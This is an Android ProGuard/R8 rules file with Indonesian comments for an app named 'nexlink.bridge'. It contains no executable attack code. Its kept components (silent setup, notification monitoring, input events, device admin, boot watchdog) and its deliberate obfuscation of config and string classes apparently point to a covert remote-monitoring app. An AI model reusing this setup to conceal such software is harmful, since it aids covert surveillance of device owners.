# ─── Android Framework ───────────────────────────────────────────────────────
-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator CREATOR;
}
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}
-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod

# ─── Manifest Components (nama harus cocok dengan AndroidManifest.xml) ───────
-keep class com.nexlink.bridge.MainActivity
-keep class com.nexlink.bridge.ConnectorService
-keep class com.nexlink.bridge.BootReceiver
-keep class com.nexlink.bridge.WatchdogReceiver
-keep class com.nexlink.bridge.AppDeviceAdminReceiver
-keep class com.nexlink.bridge.SilentSetupActivity
-keep class com.nexlink.bridge.NotificationMonitor
-keep class com.nexlink.bridge.InputEventService

# ─── ViewBinding ─────────────────────────────────────────────────────────────
-keep class com.nexlink.bridge.databinding.** { *; }

# ─── SecureConfig & ObfStr — biarkan R8 obfuscate sepenuhnya (JANGAN -keep) ──
# Class-class ini sengaja tidak di-keep agar nama class + method ter-obfuscate

# ─── Shizuku ─────────────────────────────────────────────────────────────────
-keep class rikka.shizuku.** { *; }
-keep interface rikka.shizuku.** { *; }
-dontwarn rikka.shizuku.**

# ─── OkHttp ──────────────────────────────────────────────────────────────────
-dontwarn okhttp3.**
-dontwarn okio.**
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }

# ─── Gson ────────────────────────────────────────────────────────────────────
-keep class com.google.gson.** { *; }
-keepclassmembers class * {
    @com.google.gson.annotations.SerializedName <fields>;
}
-dontwarn com.google.gson.**

# ─── Coroutines ──────────────────────────────────────────────────────────────
-keep class kotlinx.coroutines.** { *; }
-dontwarn kotlinx.coroutines.**

# ─── Kotlin Metadata (diperlukan untuk reflection) ───────────────────────────
-keep class kotlin.Metadata { *; }
-dontwarn kotlin.**

# ─── SecureConfig — biarkan R8 obfuscate sepenuhnya (JANGAN -keep) ───────────
# Class ini sengaja tidak di-keep agar nama class + method ter-obfuscate oleh R8

# ─── Hapus log di release build ──────────────────────────────────────────────
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
}